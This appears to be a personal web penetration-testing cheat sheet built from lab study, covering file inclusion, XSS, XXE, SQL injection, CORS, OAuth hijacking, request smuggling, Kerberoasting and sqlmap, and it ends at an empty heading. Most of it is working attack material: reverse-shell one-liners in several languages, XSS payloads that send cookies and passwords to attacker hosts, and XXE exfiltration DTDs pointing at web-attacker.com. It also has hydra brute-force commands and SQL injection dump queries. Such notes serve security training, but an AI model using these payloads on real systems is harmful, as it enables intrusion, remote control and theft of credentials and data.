
# 1	FILE INCLUSION

## 1.1	LOCAL FILE INCLUSION

### 1.1.1	DIRECTORY TRAVERSAL

- Include `../` characters to trick parser into accessing directories above the indicated directory, possibly revealing sensitive information.

`http://10.10.10.100/photoalbum/disaply.php?photo=../../../../../../etc/passwd`

### 1.1.2	PHP WRAPPERS

#### 1.1.2.1	Expect

`http://10.10.10.100/photoalbum/disaply.php?photo=expect://ls`

#### 1.1.2.2	Data

- Inject the PHP code you want directly in the URL

`http://10.102.2.220/description.php?page=data:text/plain,<?system($_GET['x']);?>&x=(<command here>)`

source: [2]

#### 1.1.2.3	Filter

`http://10.102.3.45/description.php?page=php://filter/convert.base64-encode/resource=config.php`

- Useful if the resource in question is a php file that doesn't render properly.

source: [2]

## 1.2	REMOTE FILE INCLUSION

### 1.2.1	HTTP Inclusion

`$ python -m SimpleHTTPServer 4444 http://10.102.8.127/description.php?page=http://10.102.5.106:4444/shell.php`

- If http is blocked, try HTTP or other caps variations.

### 1.2.2	SMB Inclusion

- Use when "allow_url_include=0" and http:// is blocked.

`$ python smbshare.py –smb2support sharepath /root/Desktop/Shells http://10.102.8.127/description.php?page=\\10.102.5.106\sharepath\shell.php`

source: [1]

# 2	CROSS SITE SCRIPTING

## 2.1	REFLECTED

- Occurs when user inputs (like URL parameters) are reflected back onto the web page. Adversaries can inject script tags to run arbitrary code.

`http://10.102.11.197/purchase?id=<script>alert("xss")</script>`

### 2.1.1	-

- Tip: check if URL parameter is reflected in the webpage. I.e. from Blake Jarvis, "web.k" reflected into "class" attribute. double-quotes not escaped, leading to xss.

`es-pe/web.k"onpageshow=alert(1)%20y="`

### 2.1.2	-

- Tip: If a certain payload doesn't work, try multiple. PortSwigger lab rejected `<script>` tags but worked with `<img>` tag. [23]

## 2.2	STORED

- Occurs when user inputs are STORED (like blog comments) and reflected back onto the web page. Anyone visiting the blog will be victim.  

## 2.3	DOM-BASED

- The technique to avoid sending payload to the server hinges on the fact that URI fragments (i.e. part in URI after #) is not sent to server

`somesite.com/page.html#default=<XSSinjection>`

### 2.3.1	-

- If input is reflected in href tag, try the following payload to achieve code execution [24]

`javascript:alert(1)`

`https://0a76008f032e38dec037a4a3007c0075.web-security-academy.net/feedback?returnPath=javascript:alert(1)`

### 2.3.2	-

- This example includes XSS payload included after # in the URL. jQuery code on the webpage executes it.  

`https://0a6c00cb04681a13c0f2cfe7000800d9.web-security-academy.net/#<img%20src=x%20onerror=alert(1)>`

### 2.3.3	-

- Check if user input is used in eval() anywhere.

### 2.3.4	-

- Check if user input is used in DOM statements such as "document.write" or "document.innerHTML"

  

## 2.4	EXFILTRATING A VICTIM'S COOKIES

### 2.4.1	WEBSERVER REDIRECTION

`$ python -m http.server 80`

`<script>window.location.replace("http://10.102.4.49/"+document.cookie)</script>`         //NOT STEALTHY!!!

### 2.4.2	BURPSUITE COLLABORATOR CLIENT

- Create Burp Collaborator link

#### 2.4.2.1	SIMPLE

`<script>window.location.replace("http://<BURP-COLLABORATOR-SUBDOMAIN>/"+document.cookie)</script>`

#### 2.4.2.2	ELEGANT

`<script>fetch('https://<BURP-COLLABORATOR-SUBDOMAIN>', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>`

## 2.5	EXFILTRATING PASSWORD

### 2.5.1	BURPSUITE COLLABORATOR CLIENT

#### 2.5.1.1	2.5.1.1 

`<input name=username id=username>`

`<input type=password name=password onchange="if(this.value.length)fetch('https://<BURP-COLLABORATOR-SUBDOMAIN>',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">`

### 2.5.2	PRAETORIAN DNS

`<h1>Reauthenticate:</h1><input type=password onchange="fetch('http://'+this.value+'.dns.praetorianlabs.com')" placeholder="password">`

## 2.6	FILTER EVASION

- Full list at https://kalilinuxtutorials.com/xss-payload-list/

### 2.6.1	-

`<BODY ONLOAD=alert('XSS')>`

### 2.6.2	IF CARETS ENCODED [26]

#### 2.6.2.1	-

`"onpageshow="alert(1)`

#### 2.6.2.2	-

`"onmouseover="alert(1)`

### 2.6.3	JSON BREAKOUT [28]

- This example only works if input is within eval()

- If http response is JSON format, break out by:
	- inserting \" to break out
	- add in arithmetic operator like "-" or "+"
	- run execution code, i.e. alert(1)
	- add in // double backslash to comment out rest of JSON

`\"-alert(1)}//`

`https://0a2700a504f96ce0c1f96a4700e900dc.web-security-academy.net/?search=\"-alert(1)//`

### 2.6.4	JAVASCRIPT REPLACE FUNCTION

- JavaScript replace() function only removes first instance of offending characters.

`<><img src=x onerror=alert(1)>`

### 2.6.5	EXHAUSTIVE XSS CAPABILITY CHECK

#### 2.6.5.1	[30]

- Use when WAF blocks many/most HTML tags and attributes. This technique will check if any vulnerable tags are available.
- Burp Intruder
- Send request with <§§>
- Use XSS Cheat Sheet [31] as payload. First, check allowed tags.
- Then, check allowed attributes.
- For example, `<body%20§§=1>`

### 2.6.6	HEX-ENCODING

#### 2.6.6.1	EXAMPLE

If '/' is blocked, try '\x2f'. Hex-encoding with '\x' delimiter.

## 2.7	XSS POLYGLOT

### 2.7.1	[25]

```
JavaScript://%250Aalert?.(1)//*'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76->\
```

### 2.7.2	Praetorian destination

```
JavaScript://%250Aalert?.(1)//*'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)("x2467")}//><Base/Href=//praetorian.com\76->\
```

### 2.7.3	ENCODED

```
JavaScript%3A%2F%2F%25250Aalert%3F.(1)%2F%2F*%27%2F*%5C%27%2F*%22%2F*%5C%22%2F*%60%2F*%5C%60%2F*%2526apos%3B)%2F*%3C!-%3E%3C%2FTitle%2F%3C%2FStyle%2F%3C%2FScript%2F%3C%2FtextArea%2F%3C%2FiFrame%2F%3C%2FnoScript%3E%5C74k%3CK%2FcontentEditable%2FautoFocus%2FOnFocus%3D%2F*%24%7B%2F*%2F%3B%7B%2F**%2F(alert)(%22x2467%22)%7D%2F%2F%3E%3CBase%2FHref%3D%2F%2Fpraetorian.com%5C76-%3E%5C
```

### 2.7.4	Shortest

`<K/contentEditable/autoFocus/OnFocus=(alert)("x2467")>`

## 2.8	CSRF THROUGH XSS

### 2.8.1	[29]

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/my-account/change-email', true);
changeReq.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

- req.open points to /my-account since this is the webpage where the query CSRF is sent to client.

- var `token` is set this way since the csrf token is labeled as "csrf" in HTML

- changeReq request imitates normal POST request, including URL and HTTP body.

## 2.9	XSS VIA CUSTOM TAG

### 2.9.1	[32]

#### 2.9.1.1	EXAMPLE PAYLOAD

`<xss id=x2467 onfocus=alert(document.cookie) tabindex=1>`

`https://0a3b008003696505c0a44a0300ca00f2.web-security-academy.net/?search=%3Cxss+id%3D%22x2467%22+onfocus%3Dalert(1)+tabindex%3D1%3E#x2467`

#### 2.9.1.2	DESCRIPTION

- Custom tag is `<xss>`
- Set custom id of "x2467". This will allow us to focus on the element later with #
- Set payload within onfocus attribute
- Set tabindex attribute in order for element to be focusable [33]
- In URL, focus on the new element with` #<id>`

## 2.10	XSS VIA CANONICAL LINK

### 2.10.1	[34]

#### 2.10.1.1	EXAMPLE PAYLOAD

`'accesskey='x'onclick='alert(1)`

`https://your-lab-id.web-security-academy.net/?'accesskey='x'onclick='alert(1)`

- Execute via CTRL+ALT+X

# 3	COMMAND LINE KUNG FU

## 3.1	COMMAND HISTORY

### 
- Commands entered in terminal are tracked using HISTFILE environment variable and written to ~/.bashrc when user logs off.

### 
- Prevent commands being recorded by prepending with a space. Alternatively, use 'set +o history' and 'set -o history'

## 3.2	SUDO

### 3.2.1	TIMEOUT

- By default, set to 5 or 15 minutes based on OS
- Session timeouts tracked using file records. Often at `/run/sudo/ts/<USERNAME>`

### 3.2.2	Sessions

- By default, sudo honors session segregation. You would have to authenticate for two separate windows.
- tty_tickets flag controls this

# 4	DESERIALIZATION ATTACKS

## 4.1	.NET

### 4.1.1	DETECTION

#### 4.1.1.1	SOURCE CODE SCAN [44]

- The following terms are suspect
	- TypeNameHandling
	- JavaScriptTypeResolver
	- BinaryFormatter

- Ensure XmlSerializer is not dynamically instantiated: [46]

`XmlSerializer(typeof(<TYPE>))`

#### 4.1.1.2	BLACK BOX [45]

- Search for the following b64 encoded prefixes
	- AAEAAD = .NET BinaryFormatter
	- FF01 = .NET ViewState

# 5	WEBSITE ENUMERATION

## 5.1	BASICS

### 5.1.1	ROBOTS TXT FILE

- Check http://example.com/robots.txt

### 5.1.2	ADMIN DIRECTORY

- Check http://example.com/admin

### 5.1.3	HEADER INJECTION

#### 5.1.3.1	REFERER

- Referer: http://127.0.0.1

# 6	BRUTE FORCING

## 6.1	BASIC AUTH

### 6.1.1	HYDRA

`hydra -l <USERNAME> -P <PASSWORDLIST> <IP> -s <PORT> http-get "/<PATH>"`

## 6.2	SSH

### 6.2.1	HYDRA

`hydra -l <USERNAME> -P <PASSWORDLIST> -s <PORT> ssh://<IP>`

# 7	KERBEROASTING [20]

## 7.1	DESCRIPTION

- Technique used to collect Kerberos tickets for service accounts that contain password hashes
- Hashes can be cracked offline. Service accounts sometimes run with elevated privileges.

## 7.2	SERVICE PRINCIPAL NAMES (SPN)

- Used to identify services on Windows
- They must be associated with an account (usually a service account)
- Any domain account including non-admin user can request tickets for these accounts

## 7.3	GET USER SPNs

- PowerSploit. Invoke-Kerberoast
- Empire

### 7.3.1	IMPACKET GetUserSPNs.py

`python GetUserSPNs.py -dc-ip <IP OF DC> <DOMAIN>/<USERNAME>:<PASSWORD> -request`

## 7.4	CRACK HASH

### 7.4.1	HASHCAT

`hashcat -m 13100 -a 0 <HASHFILE> <WORDLISTFILE>`

## 7.5	EXPLOIT

- Use msfconsole psexec module to pwn the DC with new creds. Access as service account

# 8	REVERSE SHELLS [3][37][40]

## 8.1	PHP

### 8.1.1	-

`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1'");?>`

### 8.1.2	-

`php -r '$sock=fsockopen("<LISTENER_IP>",<LISTENER_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`

## 8.2	NETCAT

### 8.2.1	-

`nc -e /bin/sh <LISTENER_IP> <LISTENER_PORT>`

### 8.2.2	-

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LISTENER_IP> <LISTENER_PORT> >/tmp/f`

## 8.3	BASH

### 8.3.1	-

`bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1`


## 8.4	PYTHON

### 8.4.1	-

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

## 8.5	PERL

### 8.5.1	-

`perl -e 'use Socket;$i="<LISTENER_IP>";$p=<LISTENER_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

## 8.6	NODEJS

### 8.6.1	-

```
var net = require("net"), sh = require("child_process").exec("/bin/bash");

var client = new net.Socket();

client.connect(<LISTENER_PORT>, "<LISTENER_IP>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);

sh.stderr.pipe(client);});
```

## 8.7	NIM

### 8.7.1	[47]

- see "rev_shell.nim"
- A simple reverse shell written in Nim that bypasses Windows Defender detection.

  

# 9	CORS

## 9.1	REFLECTED ORIGIN HEADER IN Access-Control-Allow-Origin HEADER

### 9.1.1	DESCRIPTION

### 9.1.2	SAMPLE PAYLOAD

```
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); //target
req.withCredentials = true;
req.send();  

function reqListener() {
location='/log?key='+this.responseText; //Attacker exfiltration server
};
</script>
```

## 9.2	TRUSTED NULL ORIGIN

### 9.2.1	DESCRIPTION

- If Origin: null is accepted origin, payload can be created within an iframe on attacker site, to emulate null origin.

### 9.2.2	SAMPLE PAYLOAD

## 9.3	TRUSTED SUBDOMAINS [36]

### 9.3.1	DESCRIPTION

- If http://test.com is accepted origin, check if http://evil.test.com is accepted origin.
	- If subdomain has an XSS vulnerability, can exploit this to leak sensitive data

### 9.3.2	SAMPLE PAYLOAD

```
<script>

document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"

</script>
```

# 10	OAUTH

## 10.1	OVERVIEW

### 10.1.1	ACTORS [34]

- Client application: The website or web application that wants to access the user's data.
- Resource owner: The user whose data the client application wants to access.
- OAuth service provider: The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.

## 10.2	LACK OF STATE PARAMETER

### 10.2.1	DESCRIPTION [34]

- The state parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow.
- This value is then passed back and forth between the client application and the OAuth service as a form of CSRF token for the client application.

### 10.2.2	CSRF ATTACK

- If application does not have a state parameter

- Proceed with application flow until code is provided

`GET /oauth-login?code=oq3qEnE0sLDSvC0pU5sJH_F6Fl_D2-0LarqzpRvQMuh`

- Drop this request, so the code stays valid. Induce victim to click on link.

- Victim's client application account will now be tied to attacker's OAuth service provider.

## 10.3	REDIRECT_URI TAMPERING

### 10.3.1	DESCRIPTION [34]

- Depending on the grant type, either a code or token is sent via the victim's browser to the /callback endpoint specified in the redirect_uri parameter of the authorization request.
- An attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect_uri

### 10.3.2	ACCOUNT HIJACKING

- Create a malicious page with iframe

`src = https://<OAUTH_SERVER>/auth?client_id=<CLIENT_ID>&redirect_uri=https://<MALICIOUSPAGE/EXPLOIT>&response_type=code&scope=openid%20profile%20email`

- Once victim clicks link, attacker's malicious /exploit endpoint will receive a request will receive generated code on behalf of victim

- Use this code to complete attacker OAuth signin

## 10.4	REDIRECT_URI TAMPERING WITH DIRECTORY TRAVERSAL AND OPEN REDIRECT [35]

### 10.4.1	DESCRIPTION

- Application does not allow arbitrary redirect_uri in OAuth flow
- However, application suffers from directory traversal in redirect_uri

`https://0a7600fa030265c2c09b6fb700bf0039.web-security-academy.net/oauth-callback/../` succeeds

- Application also suffers from Open Redirect elsewhere in the application

`GET /post/next?path=/post?postId=7`

- Combine these vulnerabilities for OAuth Hijack

```
https://oauth-0a7100ff03bd6506c0656fae027f00c3.web-security-academy.net/auth?client_id=isgfn26et0sfnowt1gyyv&redirect_uri=https://0a7600fa030265c2c09b6fb700bf0039.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0abe001b030265f9c0e16ff501a00034.web-security-academy.net/exploit&response_type=token&nonce=-1025754742&scope=openid%20profile%20email
```

- contents of /exploit

```
<script>
if (!document.location.hash) {
window.location = 'https://YOUR-LAB-AUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'

} else {
window.location = '/?'+document.location.hash.substr(1)
}
</script>
```

# 11	BYPASSING HTTP CLIENT-SIDE CONTROLS

## 11.1	HIDDEN FORM FIELDS

## 11.2	HTTP COOKIES

admin=true

## 11.3	URL PARAMETERS

http://www.derricksdoughnuts.com/apply_discount?discount_percent=10

## 11.4	REFERER HEADER

- Developers will sometimes restrict access depending on the HTTP header information contained in a request. Try changing Referrer header.

# 12	HTTP REQUEST SMUGGLING

## 12.1	DESCRIPTION

- The HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.
- If front-end and back-end servers interpret incoming requests differently, an attacker may be able to trick the servers to "smuggle" content that normally would be blocked. Or to tamper with next request.

## 12.2	EXPLOITS

### 12.2.1	BASIC CL.TE

- First server interprets Content-Length. Second interprets Transfer-Encoding.
- Create message with smuggled part at the end. Then, add newlines and 0 at beginning to trick TE server. Update Content-Length appropriately.

```
POST / HTTP/1.1

Host: vulnerable-website.com

Content-Length: 13

Transfer-Encoding: chunked

  

0

  

SMUGGLED
```

### 12.2.2	BASIC TE.CL

- First server interprets Transfer-Encoding, Second interprets Content-Length
- Create a normal chunked message that will be smuggled. Then, craft Content-Length header to cut off before it begins. The below example cuts off a "8".

```
POST / HTTP/1.1

Host: vulnerable-website.com

Content-Length: 3

Transfer-Encoding: chunked

  

8

SMUGGLED

0
```

# 13	DIRBUSTING

## 13.1	ADVANCED OPTIONS

### 13.1.1	HTTP OPTIONS

#### 13.1.1.1	CUSTOM HTTP HEADERS

##### 13.1.1.1.1	-

- X-Forwarded-For set to 127.0.0.1 to reveal web pages only accessible to localhost

##### 13.1.1.1.2	-

- Can add Basic auth header

#### 13.1.1.2	HTTP USER AGENT

- Change to an inconspicuous user agent

### 13.1.2	SCAN OPTIONS

#### 13.1.2.1	-

- Limit number of requests per second to increase stealth

## 13.2	FEROXBUSTER

- Much better than any other dir brute forcing tool. Supports multiple http verbs AND recursion.

### 13.2.1	EXAMPLE

```
feroxbuster -u "http://apigateway:8000" -m GET,POST -w /usr/share/wordlists/dirb/small.txt -s 200,400,401,403,500 --force-recursion -d 2
```

## 13.3	GOBUSTER

### 13.3.1	EXAMPLE

```
gobuster dir -u http://192.168.148.247 -w /usr/share/wordlists/dirb/small.txt -b 301
```

# 14	XXE INJECTION

## 14.1	BASICS

### 14.1.1	EXPLOITING XXE TO RETRIEVE FILES [12,13]

#### 14.1.1.1	BASIC FILE RETRIEVAL

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### 14.1.1.2	BASE64 FILE RETRIEVAL [17]

##### 14.1.1.2.1	-

```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```

##### 14.1.1.2.2	-

```
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" > ]>
```

### 14.1.2	SSRF ATTACKS [12]

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

### 14.1.3	XXE to RCE WITH PHP [16]

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
```

### 14.1.4	BILLION LAUGHS ATTACK

```
<!DOCTYPE dos [
<!ENTITY dos1 "DOS Attack">
<!ENTITY dos2 "&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;">
<!ENTITY dos3 "&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;">
<!ENTITY dos4 "&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;">
<!ENTITY dos5 "&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;">
<!ENTITY dos6 "&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;">
<!ENTITY dos7 "&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;">
<!ENTITY dos8 "&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;">
<!ENTITY dos9 "&dos8;&dos8;&dos8;&dos8;&dos8;&dos8;&dos8;&dos8;&dos8;&dos8;"> ]>
<leave><employerId>&dos9;</employerId></leave>
```

## 14.2	BLIND XXE

### 14.2.1	DETECTION

- Induce SSRF via SimpleHTTPServer, check if traffic occurred.

### 14.2.2	EXPLOITING BLIND XXE TO EXFILTRATE DATA OUT-OF-BAND [14]

- Host malicious DTD (Document Type Definition) on controlled system
- Invoke external malicious DTD from within the in-band XXE payload

#### 14.2.2.1	Option 1 [14]

##### 14.2.2.1.1	ATTACKER SERVER

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

##### 14.2.2.1.2	XXE PAYLOAD

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

#### 14.2.2.2	Option 2 [15]

##### 14.2.2.2.1	ATTACKER SERVER

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ext "<!ENTITY exfil SYSTEM 'file:///%file;'>">
```

##### 14.2.2.2.2	XXE PAYLOAD

```
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://yourdomainname.com/exploitd.dtd"> %xxe; %ext; ]>
<foo><u>
&exfil;
</u></foo>
```

  

# 15	SQL INJECTION

## 15.1	BASICS

### 15.1.1	BASIC INJECTION

`' OR 1=1 -- `

- Note the space at the end. The `--` is for commenting out the rest of the legitimate line.

### 15.1.2	DATABASE ENUMERATION

#### 15.1.2.1	ENUMERATE DATABASES

##### 15.1.2.1.1	-

```
```' UNION SELECT schema_name, NULL, NULL,... FROM information_schema.schemata --
```

##### -

```
' UNION SELECT DATABASE(),2,...N --
```

- Enumerates only current database

#### ENUMERATE NUMBER OF COLUMNS IN CURRENT SELECT STATEMENT

```
james' ORDER BY <N> --
```

- Increment `<N>` until it returns an invalid response.

#### ENUMERATE VULNERABLE COLUMNS

```
james' UNION SELECT 1,..,N --
```

Returns vulnerable columns. Not sure how this works exactly?

#### ENUMERATE TABLES

##### -

```
james' UNION SELECT 1,..,N-1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() --
```

##### -

```
' UNION SELECT table_name, NUll, NUll,... FROM information_schema.tables WHERE table_schema='<DATABASE NAME>' --
```

#### ENUMERATE COLUMNS

##### -

```
james' UNION SELECT 1,...,N-1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='<TABLE>' --
```

##### -

```
' UNION SELECT column_name, NULL, NULL,... FROM information_schema.columns WHERE table_name='<TABLE NAME>' --
```

#### EXFILTRATING DATA

```
' UNION SELECT <COLUMN>, NULL, NULL, NULL, NULL,..., FROM <TABLE> WHERE id=1 --
```

- In order for a UNION to work, there must be an equal number of columns in each SELECT statement

- Each column must also have the same data type (using NULL can overcome this)

### FILTER EVASION

#### ABNORMAL CAPITALIZATION

```
UnION, SeLECT
```

#### URL ENCODING

```
%55 equals 'U'
```

```
%55NION, %53ELECT
```

#### MULTI-LINE COMMENTS

```
UN/**/ION, SE/**/LECT
```

#### PLUS+ CONCATENATION

- '+' can be used to build an injection query without the use of quotes
	- not verified

```
UNION+SELECT+
```

#### POUND# BYPASS

- Abuses inline comment system within MySQL
	- not verified

```
#UNION #SELECT
```


#### REVERSE FUNCTION

- not verified

```
REVERSE('NOINU') REVERSE('TCELES')
```

#### HEX ENCODING

- Useful when ' character is blocked

`WHERE username=0x626f62` is analagous to `WHERE username='bob'`


#### CONCAT CHAR

- Useful when ' character is blocked

`WHERE username=CONCAT(CHAR(77),CHAR(76),CHAR(75))` is analagous to `WHERE username='MLK'`

#### IF SPACE CHARACTER BLOCKED

- Can use multi-line comments

```
<VALIIDVALUE>')/**/OR/**/1=1%23
```

## BOOLEAN-BASED BLIND [6,7]

### PROOF OF CONCEPT

#### -

```
<VALIDVALUE>' AND '1'='1
```

- should return value

```
<VALIDVALUE>' AND '1'='2
```

- should NOT return value

#### (OSWE ATutor)

```
<VALIDVALUE>') OR 1=1#
```

- should return value

```
<VALIDVALUE>') OR 1=2#
```

- should NOT return value

### ENUMERATE DATABASE

#### LENGTH

```
' OR LENGTH(DATABASE())='<LENGTH>
```

#### NAME

```
' OR SUBSTRING(DATABASE(),<INDEX>,1)='<CHAR>
```

### ENUMERATE TABLE(S)

#### LENGTH

```
' OR LENGTH((SELECT table_name from information_schema.tables where table_schema=DATABASE() limit 0,1))='<LENGTH>
```

#### NAME

```
' OR SUBSTRING((SELECT table_name from information_schema.tables where table_schema=DATABASE() limit 0,1),<INDEX>,1)='<CHAR>
```

### ENUMERATE COLUMN(S)

#### LENGTH

```
' OR LENGTH((SELECT column_name from information_schema.columns where table_name='data' limit 0,1))='<LENGTH>
```

#### NAME

```
' OR SUBSTRING((SELECT column_name from information_schema.columns where table_name='data' limit 0,1),<INDEX>,1)='<CHAR>
```

### DUMP DATA

#### LENGTH

```
' OR LENGTH((SELECT <COLUMN> FROM <TABLE> limit 0,1))='<LENGTH>
```

#### CONTENT

```
' OR SUBSTRING((SELECT <COLUMN> FROM <TABLE> limit 0,1),<INDEX>,1)='<CHAR>
```

### AUTOMATED SCRIPT [7]
- See BooleanBlindInjectionScript.txt

## TIME-BASED BLIND [8]

### PROOF OF CONCEPT

- If this input causes a 5 second delay, probable that time-based SQL exists

```
' OR SLEEP(5) AND '1'='1
```

### FORMULA

```
' OR IF(%s, sleep(5), 'NO') AND '1'='1
```

- where %s is payload (see LENGTH and SUBSTRING sections from 20.2)

## FILE INCLUSION

### GENERAL CONCEPTS

#### PRIVILEGES AND FUNCTIONS

- FILE privilege allows user to read files [9]
- LOAD_FILE() allows reading files from filesystem [10]

### READING FILE [11]

```
' UNION SELECT LOAD_FILE('<FILE>'),2,...,N --
```

### WRITING FILE [11]

```
' UNION SELECT 1,...,N-1, "<FILECONTENTS"> into OUTFILE '<DESTINATIONPATH>' --
```

## EXPLOITATION TARGETS

### STEAL PASSWORD RESET KEY FOR ATO

### STEAL PASSWORD HASHES

### WRITE TO FILESYSTEM

## DATABASE COLLATION

## POSTGRESQL SPECIFIC

### RUNNING AS SUPERUSER

```
select current_setting('is_superuser');
```

### FILTER EVASION

#### Use CHR() and ||  concatenation to circumvent single quote sanitization

```
select chr(119) || chr(48) || chr(48) || chr(116)

w00t
```

#### Dollar-sign quoted string constants

- Can be used to replace single-quoted strings

```
select 'w00t';

select $$w00t$$;

select $TAG$w00t$TAG$
```

#### CASTING

- If SQL statement expects a number, try casting TEXT to NUMERIC and see if error message will divulge information.

```
?order=CAST((select%20VERSION())%20AS%20INTEGER)
```

### RCE

#### UDF

##### PAYLOADS [38]

```
/usr/share/sqlmap/data/udf
```

#### COMMANDS [39]

```
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

  

##### REVERSE SHELL

```
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LISTENER_IP>:<LISTENER_PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

### ENUMERATION [41][42][43]

#### VERSION

```
VERSION()
```

#### DATABASE

```
select datname FROM pg_database

select current_database()
```

#### TABLES

```
select schemaname,tablename,tableowner from pg_tables;
```

#### COLUMNS

```
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```

## MICROSOFT SQL (MSSQL) SPECIFIC

### ENUMERATION

#### RETURN 1 ROW

- Alternative to LIMIT and OFFSET keywords

```
... ORDER by <column> OFFSET <index> ROWS FETCH NEXT 1 ROWS ONLY;
```

  
# SQLMAP

## BASIC ATTACK FLOW [4,5]

Target: `http://10.102.9.174/DBSearch?name=test3&age=test3&location=test3&type=insurer`

### TEST FOR INJECTION

```
sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' --cookie='<COOKIE>' -p '<PARAMETER>'
```

### LIST ALL DATABASES

```
sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' --dbs
```

### LIST ALL TABLES IN DATABASES

```
sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' -D iml --tables
```

### LIST ALL COLUMNS IN TABLE

```
sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' -D iml -T hidden_table --columns
```

### DUMP SELECTED COLUMNS

```
sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' -D iml -T hidden_table -C secret --dump
```


# Server-side Template Injection (SSTI)

## DESCRIPTION

- Attacker uses native template syntax to inject a payload into a web template, which is then executed server-side and displayed to end user.
- Unlike most reflected or stored XSS vulnerabilities, a template injection vulnerability can result in code being run on the server, rather than the user's client.
- AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). [27]
- When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces.
- This technique is useful when angle brackets are being encoded.

## IDENTIFYING

